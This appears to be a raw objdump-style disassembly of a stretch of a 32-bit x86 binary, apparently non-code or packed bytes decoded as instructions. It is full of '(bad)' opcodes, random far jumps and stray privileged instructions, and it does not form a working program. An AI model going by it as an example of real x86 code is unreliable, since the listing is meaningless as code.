  415607:	mov    al,ds:0xd6104df1
  41560c:	xor    ebp,DWORD PTR [eiz*8+0x614c83d4]
  415613:	cmp    al,0x38
  415615:	inc    edx
  415616:	xchg   ebx,eax
  415617:	cli    
  415618:	jmp    0x41560e
  41561a:	dec    esi
  41561b:	jns    0x415676
  41561d:	dec    ecx
  41561e:	or     eax,0xc9346e16
  415623:	daa    
  415624:	pop    es
  415625:	cmp    eax,edx
  415627:	dec    ebp
  415628:	sbb    ch,BYTE PTR [esi]
  41562a:	arpl   WORD PTR [edi+0xb],cx
  41562d:	dec    edi
  41562e:	cli    
  41562f:	pop    ebx
  415630:	jmp    0x984fa253
  415635:	pop    ebp
  415636:	or     al,0x5c
  415638:	and    esi,DWORD PTR [esi]
  41563a:	fxch   st(4)
  41563c:	mul    BYTE PTR [ecx-0x213769a6]
  415642:	xor    al,cl
  415644:	sbb    DWORD PTR [ecx],ebx
  415646:	jnp    0x415697
  415648:	mov    DWORD PTR ss:[ebp+0x78],ecx
  41564c:	jns    0x41568a
  41564e:	mov    gs,WORD PTR [edi-0x5777fa3c]
  415654:	test   al,0x76
  415656:	ja     0x4156cb
  415658:	shl    DWORD PTR [edx-0x408db379],0xaf
  41565f:	arpl   WORD PTR [eax+ebp*2+0x38b0796c],ax
  415666:	rol    dh,cl
  415668:	mov    esp,0x3d7661cf
  41566d:	inc    ebx
  41566e:	add    eax,0x78ba2096
  415673:	addr16 pop es
  415675:	pop    es
  415676:	xchg   ecx,eax
  415677:	pop    edx
  415678:	inc    edx
  415679:	(bad)  
  41567a:	ss push edx
  41567c:	cld    
  41567d:	cmp    dl,bh
  41567f:	push   es
  415680:	sub    ecx,DWORD PTR [ecx+ebp*2-0x315c418d]
  415687:	fisubr DWORD PTR [edi-0x31]
  41568a:	jmp    0x415656
  41568c:	iret   
  41568d:	hlt    
  41568e:	mov    edx,0x3642b9c9
  415693:	adc    DWORD PTR [edx+0x9d48a9f],esp
  415699:	inc    ebx
  41569a:	and    bl,BYTE PTR ds:0xb53036ac
  4156a0:	and    BYTE PTR gs:[eax-0x6d],0x53
  4156a5:	adc    eax,0x3e6ad11e
  4156aa:	adc    edi,edi
  4156ac:	das    
  4156ad:	sub    edx,DWORD PTR [ecx-0x22e99991]
  4156b3:	xchg   BYTE PTR [eax],ch
  4156b5:	mov    al,0xae
  4156b7:	or     BYTE PTR [ebp-0x161af118],0x6b
  4156be:	loopne 0x4156b3
  4156c0:	jmp    0x8e1052c1
  4156c5:	xchg   edx,eax
  4156c6:	and    al,0x2e
  4156c8:	cli    
  4156c9:	ins    BYTE PTR es:[edi],dx
  4156ca:	fild   QWORD PTR [ebp-0x68]
  4156cd:	in     eax,0xd4
  4156cf:	sbb    ebp,ecx
  4156d1:	shl    edi,0x2b
  4156d4:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156d6:	cwde   
  4156d7:	pop    ebx
  4156d8:	xor    BYTE PTR [esi],al
  4156da:	push   0x78ad28de
  4156df:	mov    esp,0x60de4967
  4156e4:	pop    edi
  4156e5:	sub    al,0x29
  4156e7:	loope  0x415763
  4156e9:	push   ss
  4156ea:	gs pop ebp
  4156ec:	aad    0x8d
  4156ee:	inc    esi
  4156ef:	mov    al,0xbe
  4156f1:	push   0x47
  4156f3:	sbb    al,0xc6
  4156f5:	and    dh,BYTE PTR [ebp+0x35]
  4156f8:	jecxz  0x415683
  4156fa:	cmp    dl,BYTE PTR [eax+0x39]
  4156fd:	jl     0x4156b3
  4156ff:	int    0xfb
  415701:	addr16 aad 0x7d
  415704:	sbb    cl,bh
  415706:	shl    ch,cl
  415708:	inc    edi
  415709:	xchg   esp,eax
  41570a:	sbb    esp,DWORD PTR [esi-0x67dde486]
  415710:	rol    BYTE PTR [edx-0x5f7ae87f],1
  415716:	push   ebp
  415717:	jnp    0x41578b
  415719:	mov    bh,0x4d
  41571b:	and    al,dh
  41571d:	dec    ecx
  41571e:	pop    ebp
  41571f:	cmp    al,0x30
  415721:	xor    al,0xce
  415723:	push   0xc1e98de9
  415728:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415729:	mov    bh,0x7
  41572b:	xor    BYTE PTR [edi+0x4b],ah
  41572e:	shl    BYTE PTR [edx+0x8],cl
  415731:	mov    al,ds:0xb06177fc
  415736:	jb     0x415763
  415738:	push   eax
  415739:	(bad)
  41573c:	ins    DWORD PTR es:[edi],dx
  41573d:	xchg   ebx,eax
  41573e:	mov    edx,ecx
  415740:	cmc    
  415741:	fwait
  415742:	xor    eax,0x52d6ee7c
  415747:	jns    0x41575f
  415749:	dec    ebp
  41574a:	pop    ebx
  41574b:	add    DWORD PTR [edx],ebp
  41574d:	sbb    BYTE PTR [ebx-0x5966bc7c],al
  415753:	pop    edx
  415754:	pop    es
  415755:	nop
  415756:	fs jl  0x4157a0
  415759:	mov    bh,0xc2
  41575b:	dec    ebp
  41575c:	pop    ebx
  41575d:	ret    
  41575e:	ins    BYTE PTR es:[edi],dx
  41575f:	sub    eax,0xfc06061e
  415764:	xchg   esi,eax
  415765:	or     eax,0x59343c6e
  41576a:	and    DWORD PTR [ebx+0x29cfabeb],ebx
  415770:	mov    dh,0xda
  415772:	ja     0x415754
  415774:	jecxz  0x41579b
  415776:	push   ecx
  415777:	aam    0xb5
  415779:	dec    ebp
  41577a:	retf   0x6470
  41577d:	fdiv   DWORD PTR [ecx]
  41577f:	and    DWORD PTR [eax+0xc04278c],ebp
  415785:	lock adc ch,BYTE PTR [edx-0x1e0af03b]
  41578c:	sub    al,0x96
  41578e:	add    eax,0x480757cf
  415793:	jp     0x415734
  415795:	sar    BYTE PTR [ebx+0x4b],1
  415798:	dec    edi
  415799:	jmp    0xe755:0x9f350c50
  4157a0:	pop    eax
  4157a1:	popf   
  4157a2:	mov    ds:0x72d9c44c,al
  4157a7:	push   ecx
  4157a8:	mov    eax,ds:0xd33ee284
  4157ad:	fsubr  st(0),st
  4157af:	xchg   edi,eax
  4157b0:	lahf   
  4157b1:	gs cmp al,0x4d
  4157b4:	aad    0x11
  4157b6:	nop
  4157b7:	mov    esp,0x89e98396
  4157bc:	or     al,0x18
  4157be:	es (bad) 
  4157c0:	pop    ebx
  4157c1:	cld    
  4157c2:	ja     0x415808
  4157c4:	jno    0x415779
  4157c6:	mov    ah,0x48
  4157c8:	sub    eax,0x5759db7b
  4157cd:	ret    0xe205
  4157d0:	sahf   
  4157d1:	xor    al,0x75
  4157d3:	bound  eax,QWORD PTR [edi]
  4157d5:	sub    DWORD PTR [ecx-0x62],eax
  4157d8:	fs lock lahf 
  4157db:	mov    ch,0x3e
  4157dd:	sbb    DWORD PTR [edi],edi
  4157df:	jno    0x4157fa
  4157e1:	xlat   BYTE PTR ds:[ebx]
  4157e2:	lea    ebx,[esi]
  4157e4:	fidiv  DWORD PTR [ebx]
  4157e6:	pop    ebx
  4157e7:	cmp    ecx,DWORD PTR [ebx+0x3a31137c]
  4157ed:	cmc    
  4157ee:	pop    esp
  4157ef:	cdq    
  4157f0:	pushf  
  4157f1:	sbb    al,BYTE PTR [ebp-0xd5ce6dd]
  4157f7:	jmp    0x3342:0x2f32dadb
  4157fe:	adc    ecx,DWORD PTR [eax*4-0x2096d52]
  415805:	xor    BYTE PTR [edi],0x26
  415808:	inc    edi
  415809:	addr16 addr16 push ebx
  41580c:	inc    ecx
  41580d:	or     al,0x3
  41580f:	and    BYTE PTR [ecx+0x5],al
  415812:	jb     0x41583f
  415814:	and    ah,BYTE PTR [ebx]
  415816:	stos   DWORD PTR es:[edi],eax
  415817:	aad    0xd6
  415819:	leave  
  41581a:	call   0xe871:0x6665d466
  415821:	in     eax,0x63
  415823:	lods   eax,DWORD PTR ds:[esi]
  415824:	mov    esi,0xf62b327a
  415829:	int3   
  41582a:	jecxz  0x4157cd
  41582c:	hlt    
  41582d:	pop    ebp
  41582e:	sti    
  41582f:	inc    edi
  415830:	dec    edi
  415831:	pushf  
  415832:	cld    
  415833:	test   eax,0x667188e2
  415838:	push   es
  415839:	xchg   ecx,eax
  41583a:	xchg   dh,ch
  41583c:	mov    ebp,0x4f7fe307
  415841:	(bad)  
  415842:	or     eax,esi
  415844:	loopne 0x4158c4
  415846:	xchg   BYTE PTR [esi],dl
  415848:	retf   0x5825
  41584b:	ret    
  41584c:	push   ebx
  41584d:	jo     0x415875
  41584f:	inc    esp
  415850:	mov    ecx,0x304be830
  415855:	int    0xf2
  415857:	cdq    
  415858:	cmp    BYTE PTR [eax+0x78],dl
  41585b:	jle    0x415834
  41585d:	fst    DWORD PTR [eax-0x457a4705]
  415863:	out    dx,eax
  415864:	or     al,0x68
  415866:	mov    al,0xfe
  415868:	pop    es
  415869:	pop    ecx
  41586a:	aas    
  41586b:	inc    eax
  41586c:	sbb    BYTE PTR [esi+0x32eb5ba7],cl
  415872:	(bad)  
  415874:	or     al,0xe1
  415876:	fwait
  415877:	dec    edi
  415878:	sbb    edx,DWORD PTR [ebp-0xf]
  41587b:	(bad)  
  41587c:	lock ja 0x280b9d35
  415883:	xchg   edi,eax
  415884:	in     eax,0x38
  415886:	pushf  
  415887:	sbb    ecx,DWORD PTR [esi]
  415889:	cmp    edi,ecx
  41588b:	or     DWORD PTR ds:0xb01107e0,edi
  415891:	lods   eax,DWORD PTR ds:[esi]
  415892:	ins    DWORD PTR es:[edi],dx
  415893:	push   cs
  415894:	sbb    al,0xfc
  415896:	(bad)
  415899:	in     al,0x76
  41589b:	and    eax,0x9c15ba58
  4158a0:	lds    ebx,FWORD PTR [ecx+ecx*8+0x3e]
  4158a4:	push   edi
  4158a5:	cdq    
  4158a6:	pop    ebx
  4158a7:	aaa    
  4158a8:	ja     0x41588a
  4158aa:	push   es
  4158ab:	fdivr  QWORD PTR [ebp+0x2fd7d82d]
  4158b1:	gs xchg ebp,eax
  4158b3:	cwde   
  4158b4:	cli    
  4158b5:	sub    ebx,DWORD PTR [esp+esi*4]
  4158b8:	add    ecx,DWORD PTR [esi+0x28]
  4158bb:	fld    DWORD PTR [esi]
  4158bd:	bound  esp,QWORD PTR [edi+0x4]
  4158c0:	in     al,dx
  4158c1:	adc    dl,cl
  4158c3:	test   eax,0xeda35261
  4158c8:	xchg   DWORD PTR [ebp-0x24],edi
  4158cb:	pop    ss
  4158cc:	test   al,0xb7
  4158ce:	mov    ah,0x1b
  4158d0:	mov    bh,0x53
  4158d2:	imul   ebp,DWORD PTR [ecx+0x1c],0x52
  4158d6:	loope  0x41593c
  4158d8:	inc    ebx
  4158d9:	cmp    ah,BYTE PTR [edx-0x426dcb7c]
  4158df:	popa   
  4158e0:	xchg   ebx,eax
  4158e1:	sub    eax,0x632d6bea
  4158e6:	call   0x48fc:0xe7e19bb0
  4158ed:	sbb    dl,BYTE PTR [ebx+0x7fa6cc57]
  4158f3:	ror    BYTE PTR [edi],0x22
  4158f6:	jnp    0x415902
  4158f8:	sbb    bh,BYTE PTR [ebp-0x6039d009]
  4158fe:	inc    edx
  4158ff:	(bad)  
  415900:	jg     0x415930
  415902:	sub    eax,0x1825da41
  415907:	or     al,BYTE PTR ds:0x10a0f059
  41590d:	call   0x6c178760
  415912:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415913:	mov    ds:0x95e6ef47,al
  415918:	cmc    
  415919:	nop
  41591a:	mov    eax,0x36dc6d94
  41591f:	add    DWORD PTR [esp+esi*8],edx
  415922:	cdq    
  415923:	es clc 
  415925:	xor    DWORD PTR [ebx-0x35],eax
  415928:	repz lahf 
  41592a:	out    0x3a,eax
  41592c:	lahf   
  41592d:	or     esp,edx
  41592f:	(bad)  
  415930:	int3   
  415931:	dec    edx
  415932:	aas    
  415933:	sbb    al,0xb7
  415935:	neg    BYTE PTR [edx]
  415937:	arpl   ax,bp
  415939:	adc    eax,DWORD PTR [ecx-0x4b9f41d5]
  41593f:	add    dl,ch
  415941:	lods   al,BYTE PTR ds:[esi]
  415942:	xchg   esi,eax
  415943:	jg     0x41591a
  415945:	loopne 0x41593b
  415947:	loope  0x415982
  415949:	jmp    0x41594c
  41594b:	dec    ebp
  41594c:	aaa    
  41594d:	data16 icebp 
  41594f:	mov    DWORD PTR [edi+esi*1],ecx
  415952:	sbb    eax,0xb19c3e01
  415957:	jle    0x4159cf
  415959:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41595a:	lock pop edi
  41595c:	dec    esp
  41595d:	jp     0x41592b
  41595f:	push   eax
  415960:	dec    edi
  415961:	sbb    eax,0x38f79f04
  415966:	push   ss
  415967:	push   eax
  415968:	inc    edi
  415969:	sub    bl,bl
  41596b:	mov    edx,0xf1920bcd
  415970:	leave  
  415971:	lock sub al,0x35
  415974:	pop    eax
  415975:	daa    
  415976:	and    bh,BYTE PTR [eax+0x26]
  415979:	mov    WORD PTR [eax+0x1],ss
  41597c:	les    eax,FWORD PTR [esi-0x3f4ccd19]
  415982:	out    dx,al
  415983:	dec    ebx
  415984:	int3   
  415985:	pushf  
  415986:	sub    al,0x7c
  415989:	retf   
  41598a:	ins    DWORD PTR es:[edi],dx
  41598b:	(bad)  
  41598c:	jnp    0x415924
  41598e:	test   DWORD PTR [eax-0x40],esp
  415991:	jno    0x4159c1
  415993:	stos   DWORD PTR es:[edi],eax
  415994:	cmc    
  415995:	cwde   
  415996:	int3   
  415997:	ds and al,0x3b
  41599a:	jb     0x4159bb
  41599c:	xor    BYTE PTR cs:[edi+0x71],bh
  4159a0:	adc    ebp,ecx
  4159a2:	loopne 0x415946
  4159a4:	jnp    0x415997
  4159a6:	rcr    DWORD PTR [eax-0x76],0x9f
  4159aa:	xchg   ecx,eax
  4159ab:	leave  
  4159ac:	nop
  4159ad:	jg     0x4159bb
  4159af:	or     edx,DWORD PTR [ebx-0x62]
  4159b2:	out    0x1,al
  4159b4:	mov    cl,0x2e
  4159b6:	shl    DWORD PTR [ecx],cl
  4159b8:	inc    edi
  4159b9:	mov    eax,ds:0x8b4ad971
  4159be:	imul   DWORD PTR [esi+0x57d9f]
  4159c4:	and    DWORD PTR [eax+esi*4+0x46],edi
  4159c8:	js     0x415a2e
  4159ca:	inc    edx
  4159cb:	cs sbb al,0x16
  4159ce:	out    0x7c,al
  4159d0:	cmp    bl,dh
  4159d2:	mov    WORD PTR [eax],es
  4159d4:	rcpps  xmm6,xmm2
  4159d7:	test   ebx,0xa9f96b53
  4159dd:	repnz fisub WORD PTR [esi+0x11b9dd4e]
  4159e4:	or     BYTE PTR [ebp+0x21],bh
  4159e7:	rol    BYTE PTR [esi],1
  4159e9:	pop    ebx
  4159ea:	mov    al,al
  4159ec:	ins    DWORD PTR es:[edi],dx
  4159ed:	data16 out 0x9b,al
  4159f0:	mov    ebx,0x3b9db38a
  4159f5:	mov    ch,0xea
  4159f7:	aam    0xe9
  4159f9:	jecxz  0x415a78
  4159fb:	cmc    
  4159fc:	ins    DWORD PTR es:[edi],dx
  4159fd:	or     eax,0x5ca065dc
  415a02:	adc    esp,0x44c16690
  415a08:	mov    al,0xd1
  415a0a:	fmul   DWORD PTR [edi+0x1e]
  415a0d:	or     al,0xfd
  415a0f:	jge    0x415a33
  415a11:	push   es
  415a12:	ins    DWORD PTR es:[edi],dx
  415a13:	addr16 sbb esp,esi
  415a16:	in     al,0x6d
  415a18:	and    dl,bh
  415a1a:	inc    edx
  415a1b:	outs   dx,DWORD PTR ds:[esi]
  415a1c:	mov    esi,0xf700a4df
  415a21:	xor    BYTE PTR [ecx+0x2b],bh
  415a24:	out    dx,al
  415a25:	or     bh,al
  415a27:	je     0x415a9a
  415a29:	adc    edi,ebx
  415a2b:	cmp    eax,0x45023bde
  415a30:	cmp    DWORD PTR [esi],ecx
  415a32:	jo     0x415a59
  415a34:	add    edx,ecx
  415a36:	sbb    DWORD PTR [edx+edi*8-0x32],0xfffffff9
  415a3b:	stc    
  415a3c:	mov    dl,0x20
  415a3e:	sbb    BYTE PTR [edi],0x20
  415a41:	mov    ch,0x61
  415a43:	push   edx
  415a44:	xchg   ecx,eax
  415a45:	sti    
  415a46:	xor    ecx,0xffffffa1
  415a49:	inc    esi
  415a4a:	cmp    ebx,ebp
  415a4c:	scas   eax,DWORD PTR es:[edi]
  415a4d:	jae    0x415a4a
  415a4f:	jmp    0xc1f79808
  415a54:	cmc    
  415a55:	fbld   TBYTE PTR [edx+0x14cb0d11]
  415a5b:	loopne 0x415a89
  415a5d:	pusha  
  415a5e:	sub    al,0x95
  415a60:	rol    BYTE PTR [ebx],1
  415a62:	inc    edx
  415a63:	fcom   QWORD PTR [edx+0x3e0f8751]
  415a69:	xor    bh,BYTE PTR [esi-0x52db38b9]
  415a6f:	repnz mov ah,0xbc
  415a72:	sbb    al,0x5b
  415a74:	std    
  415a75:	(bad)  
  415a76:	clc    
  415a77:	ins    BYTE PTR es:[edi],dx
  415a78:	sub    BYTE PTR [esi+eiz*8+0x9],ch
  415a7c:	inc    ebp
  415a7d:	mov    al,0x10
  415a7f:	ins    BYTE PTR es:[edi],dx
  415a80:	mov    dh,0x98
  415a82:	cli    
  415a83:	shl    BYTE PTR [ebp+0x70],cl
  415a86:	mov    ds:0xc1a50955,eax
  415a8b:	mov    edi,0xd27eb9a
  415a90:	inc    esp
  415a91:	in     al,dx
  415a92:	aaa    
  415a93:	mov    al,0x8a
  415a95:	mov    ax,0x8663
  415a99:	adc    DWORD PTR [edi],esi
  415a9b:	cmp    BYTE PTR [edi+0x1df45f5a],ch
  415aa1:	out    dx,eax
  415aa2:	outs   dx,BYTE PTR ds:[esi]
  415aa3:	pop    edi
  415aa4:	and    dl,0x2b
  415aa7:	jb     0x415ac0
  415aa9:	or     eax,0x5d14354a
  415aae:	xor    eax,0x16b8ffe9
  415ab3:	adc    DWORD PTR [ecx],esi
  415ab5:	and    eax,0xe58c6ede
  415aba:	aaa    
  415abb:	push   ds
  415abc:	push   0x187bc5b0
  415ac1:	mov    ecx,0x7704ae6
  415ac6:	pop    ebp
  415ac7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ac8:	pusha  
  415ac9:	sbb    ebx,DWORD PTR [edx+ebx*8-0xb]
  415acd:	xor    eax,0xa2eb4f84
  415ad2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ad3:	shl    DWORD PTR [ebx],1
  415ad5:	or     cl,bh
  415ad7:	or     BYTE PTR [esi+0x16],dh
  415ada:	ret    0xdec6
  415add:	push   ebx
  415ade:	out    dx,al
  415adf:	aaa    
  415ae0:	lods   eax,DWORD PTR ds:[esi]
  415ae1:	xchg   esi,eax
  415ae2:	enter  0xe38,0xf3
  415ae6:	xchg   esi,eax
  415ae7:	test   eax,0x2661389d
  415aec:	xchg   esp,eax
  415aed:	out    dx,eax
  415aee:	push   ds
  415aef:	mov    edi,0x79ffaca3
  415af4:	in     eax,0xe0
  415af6:	jmp    0x415b64
  415af8:	clc    
  415af9:	jl     0x415ac9
  415afb:	test   BYTE PTR [esi],0x8c
  415afe:	dec    esp
  415aff:	out    dx,eax
  415b00:	jg     0x415b65
  415b02:	sbb    BYTE PTR [ecx-0x61],bl
  415b05:	and    ah,0x5e
  415b08:	sub    edi,DWORD PTR [ebx]
  415b0a:	ja     0x415ae5
  415b0c:	repz xor DWORD PTR [edi-0x7f],ecx
  415b10:	mov    ebp,0xe8d08a1d
  415b15:	adc    DWORD PTR [ecx],esi
  415b17:	iret   
  415b18:	and    eax,0x16fe98ab
  415b1d:	sub    eax,0xdb9593c3
  415b22:	inc    ecx
  415b23:	or     al,dh
  415b25:	and    DWORD PTR [ebx+eax*4+0x4c],esi
  415b29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b2a:	pop    ebp
  415b2b:	out    dx,eax
  415b2c:	lahf   
  415b2d:	pop    es
  415b2e:	rcl    DWORD PTR [ebp-0x3e],1
  415b31:	sub    ebp,DWORD PTR [edi-0xe]
  415b34:	cmp    dh,dl
  415b36:	icebp  
  415b37:	cli    
  415b38:	(bad)  
  415b39:	in     eax,0xf4
  415b3b:	add    ah,BYTE PTR ds:0x6a7e2218
  415b41:	mov    edi,0x34548b2a
  415b46:	call   0xc29eb33f
  415b4b:	mov    eax,0x572423c9
  415b50:	repnz mov bl,0x62
  415b53:	jle    0x415bbf
  415b55:	leave  
  415b56:	mov    cl,BYTE PTR [edx+0x11ecd1a4]
  415b5c:	or     eax,0xf1264ee
  415b61:	in     eax,0x3f
  415b63:	out    dx,al
  415b64:	push   0x3f
  415b66:	push   ecx
  415b67:	sti    
  415b68:	xor    dl,BYTE PTR [edi]
  415b6a:	jmp    0x415b42
  415b6c:	lock pop es
  415b6e:	mov    es,WORD PTR [ecx+0x30]
  415b71:	ins    BYTE PTR es:[edi],dx
  415b72:	pop    eax
  415b73:	pop    esp
  415b74:	ja     0x415bc8
  415b76:	mov    ebp,0x119cd4e4
  415b7b:	out    dx,eax
  415b7c:	call   0x23bf:0xd121e792
  415b83:	adc    al,0x88
  415b85:	cmc    
  415b86:	ja     0x415bf6
  415b88:	ret    0xdf5f
  415b8b:	mov    ebp,0xa0b11c5d
  415b90:	scas   eax,DWORD PTR es:[edi]
  415b91:	mov    bl,0xdb
  415b93:	mov    ch,BYTE PTR [edi]
  415b95:	test   eax,0x3dc3bbcb
  415b9a:	and    BYTE PTR [edi+0x53],0x3d
  415b9e:	gs jmp 0xebef8cad
  415ba4:	retf   0x8850
  415ba7:	and    eax,0xe00aa610
  415bac:	cld    
  415bad:	push   edi
  415bae:	aad    0x9e
  415bb0:	inc    ebp
  415bb1:	es test eax,0x577f7649
  415bb7:	mov    bl,0x4c
  415bba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415bbb:	mov    eax,ds:0x50936201
  415bc0:	pop    esi
  415bc1:	pop    esi
  415bc2:	xor    al,0x2a
  415bc4:	mov    BYTE PTR [edi],dl
  415bc6:	ror    DWORD PTR [esi],cl
  415bc8:	or     esi,DWORD PTR [ebx]
  415bca:	jl     0x415b90
  415bcc:	xchg   eax,esp
  415bce:	sbb    BYTE PTR [edi],ah
  415bd0:	ja     0x415bbd
  415bd2:	mov    ebx,0x9d4e7b32
  415bd7:	test   BYTE PTR [ebx],0x9c
  415bda:	cwde   
  415bdb:	mov    dl,BYTE PTR [ecx]
  415bdd:	cld    
  415bde:	daa    
  415bdf:	mov    edi,0xaa4a82ad
  415be4:	shr    DWORD PTR [ebx-0x5f],1
  415be7:	xchg   BYTE PTR [esi],ch
  415be9:	sahf   
  415bea:	call   0xf140:0x5cf70099
  415bf1:	push   0xffffffbe
  415bf3:	loop   0x415b9d
  415bf5:	cdq    
  415bf6:	add    eax,0x29d0f47a
  415bfb:	add    eax,0x320f43c
  415c00:	xchg   esp,eax
  415c01:	add    eax,0xc55e04b0
  415c06:	das    
  415c07:	sbb    esi,DWORD PTR [esi]
  415c09:	aas    
  415c0a:	add    al,0xa6
  415c0c:	push   ss
  415c0d:	rol    DWORD PTR [ecx+ebp*2],1
  415c10:	nop
  415c11:	jmp    0xcc98:0xddc3a360
  415c18:	pusha  
  415c19:	inc    edi
  415c1a:	pushf  
  415c1b:	add    eax,0x8ce3c838
  415c20:	jl     0x415c8b
  415c22:	les    edx,FWORD PTR [ecx-0x4399bb31]
  415c28:	dec    esi
  415c29:	sahf   
  415c2a:	push   ss
  415c2b:	xlat   BYTE PTR ds:[ebx]
  415c2c:	jne    0x415c5d
  415c2e:	or     esi,ebp
  415c30:	mul    DWORD PTR [ebx]
  415c32:	stos   DWORD PTR es:[edi],eax
  415c33:	call   0x2b3ae399
  415c38:	loopne 0x415ca1
  415c3a:	push   ebp
  415c3b:	dec    eax
  415c3c:	jl     0x415bca
  415c3e:	add    DWORD PTR [eax],esp
  415c40:	xor    ebp,esp
  415c42:	xchg   ebx,eax
  415c43:	mov    ch,0x8
  415c45:	js     0x415c92
  415c47:	bound  esp,QWORD PTR [esi+edi*4+0xf]
  415c4b:	outs   dx,DWORD PTR ds:[esi]
  415c4c:	push   ss
  415c4d:	popa   
  415c4e:	test   bh,dl
  415c50:	mov    ah,dh
  415c52:	fsub   DWORD PTR [edi+0x33]
  415c55:	mov    esi,0x2be01968
  415c5a:	jbe    0x415cae
  415c5c:	push   0x8585bff7
  415c61:	loopne 0x415cc7
  415c63:	dec    edi
  415c64:	or     cl,BYTE PTR [ecx]
  415c66:	dec    esp
  415c67:	mov    edx,DWORD PTR [edx+0xa]
  415c6a:	mov    bl,cl
  415c6c:	and    DWORD PTR [ebx+ecx*1-0x1a],ebp
  415c70:	and    ecx,ebp
  415c72:	cmp    al,0x98
  415c74:	push   es
  415c75:	(bad)  [edi+0x38]
  415c79:	xor    eax,0x68870cbc
  415c7e:	dec    esp
  415c7f:	mov    al,0x8a
  415c81:	mov    ch,0x78
  415c83:	dec    ebx
  415c84:	add    ecx,esi
  415c86:	or     DWORD PTR ds:0x7f968d0a,0xffffffb6
  415c8d:	xchg   cl,bh
  415c8f:	mov    ebx,0x6eab924f
  415c94:	div    DWORD PTR [ecx]
  415c96:	ja     0x415c55
  415c98:	adc    eax,0xd7add692
  415c9d:	dec    esi
  415c9e:	div    eax
  415ca0:	fld    TBYTE PTR [edx+0x50532ffc]
  415ca6:	es fcomip st,st(3)
  415ca9:	ret    
  415caa:	sub    BYTE PTR [ebx+0x3b],0x9e
  415cae:	sahf   
  415caf:	les    eax,FWORD PTR [esi+ebp*2]
  415cb2:	xchg   ecx,eax
  415cb3:	addr16 jo 0x415d23
  415cb6:	dec    ebx
  415cb7:	and    dh,BYTE PTR [edx-0x1c]
  415cba:	data16 jne 0x415c4d
  415cbd:	repz add DWORD PTR [esi],0xda2ee508
  415cc4:	loop   0x415cab
  415cc6:	ror    DWORD PTR [ecx],cl
  415cc8:	xor    edx,DWORD PTR [eax+edx*2]
  415ccb:	out    0x14,al
  415ccd:	leave  
  415cce:	mov    dh,0xe8
  415cd0:	xor    al,0x79
  415cd2:	or     dl,ch
  415cd4:	mov    ds:0x89ff704b,al
  415cd9:	lea    esi,[esi-0xc]
  415cdc:	frstor [eax+0x51]
  415cdf:	and    al,0xc7
  415ce1:	into   
  415ce2:	jne    0x415c84
  415ce4:	sub    DWORD PTR [eax-0x64],0xe4983c11
  415ceb:	in     eax,dx
  415cec:	ins    DWORD PTR es:[edi],dx
  415ced:	adc    BYTE PTR [eax],cl
  415cef:	add    al,0x38
  415cf1:	clc    
  415cf2:	push   ecx
  415cf3:	add    BYTE PTR [ecx+0x64515186],ah
  415cf9:	int3   
  415cfa:	adc    dh,dl
  415cfc:	xor    esi,DWORD PTR [edx-0x90784e7]
  415d02:	in     al,0xf5
  415d04:	jmp    0xe648:0x455643e7
  415d0b:	sahf   
  415d0c:	mov    al,al
  415d0e:	pop    edx
  415d0f:	sub    eax,0xead3f52e
  415d14:	mov    edx,0x5ae035a0
  415d19:	gs pop edx
  415d1b:	into   
  415d1c:	fadd   DWORD PTR [edx+0x10]
  415d1f:	inc    ecx
  415d20:	xor    eax,0x1a4efd9d
  415d25:	addr16 pop edi
  415d27:	adc    eax,0x56a42b23
  415d2c:	sub    esi,edi
  415d2e:	(bad)  
  415d2f:	xor    BYTE PTR [edi],dl
  415d31:	mov    eax,ds:0xfbda6bdc
  415d36:	dec    eax
  415d37:	pop    ebp
  415d38:	and    al,0x30
  415d3a:	daa    
  415d3b:	add    BYTE PTR [edi+0x6d7131b3],0xd7
  415d42:	mov    cl,0x41
  415d44:	inc    esp
  415d45:	mov    dl,0x54
  415d47:	add    BYTE PTR [esi],al
  415d49:	dec    esp
  415d4a:	jmp    0xe0306bb0
  415d4f:	mov    bh,0x27
  415d51:	xchg   esi,eax
  415d52:	push   es
  415d53:	and    BYTE PTR ds:0x4e4bef2b,bh
  415d59:	push   es
  415d5a:	aas    
  415d5b:	xchg   edi,eax
  415d5c:	pop    es
  415d5d:	fs jl  0x415dc4
  415d60:	pop    eax
  415d61:	push   edx
  415d62:	(bad)  ds:0xeab6a69e
  415d68:	push   ds
  415d69:	iret   
  415d6a:	jecxz  0x415daf
  415d6c:	sub    dh,BYTE PTR [ebx+0x12b12fc0]
  415d72:	push   ss
  415d73:	pop    edi
  415d74:	ss adc al,0x2a
  415d77:	pop    ds
  415d78:	shr    DWORD PTR [eax-0x79],0xf5
  415d7c:	mov    ds:0x1d70d97c,al
  415d81:	sbb    al,0xf3
  415d83:	or     eax,0x812915fe
  415d88:	outs   dx,DWORD PTR ds:[esi]
  415d89:	adc    eax,0xf274e71c
  415d8e:	ja     0x415dc7
  415d90:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d92:	adc    DWORD PTR [ecx+0x51],edi
  415d95:	out    dx,eax
  415d96:	and    ah,BYTE PTR [esi-0x5c648099]
  415d9c:	push   ebx
  415d9d:	div    DWORD PTR [esi+esi*1]
  415da0:	or     eax,0xb56b6cb6
  415da5:	scas   eax,DWORD PTR es:[edi]
  415da6:	mov    bl,ch
  415da8:	stc    
  415da9:	fisub  DWORD PTR [eax+ecx*4+0x2038fb8f]
  415db0:	stc    
  415db1:	cwde   
  415db2:	mov    ebx,0xdc16f106
  415db7:	shl    DWORD PTR [ebp+ebx*1+0x377ef37],cl
  415dbe:	setg   BYTE PTR [ebx+esi*4]
  415dc2:	mov    edx,0x1ce683bd
  415dc7:	xor    BYTE PTR [ebp-0x1a],al
  415dca:	add    BYTE PTR [eax-0x5bbc9f57],dl
  415dd0:	repnz sub edx,DWORD PTR [edi]
  415dd3:	mov    ebp,0x622da2bf
  415dd8:	out    dx,al
  415dd9:	jecxz  0x415d91
  415ddb:	and    bh,BYTE PTR [ebx-0x21f6390b]
  415de1:	jo     0x415deb
  415de3:	(bad)  
  415de4:	dec    ebp
  415de5:	jp     0x415e23
  415de7:	mov    cl,0xe3
  415de9:	pop    ecx
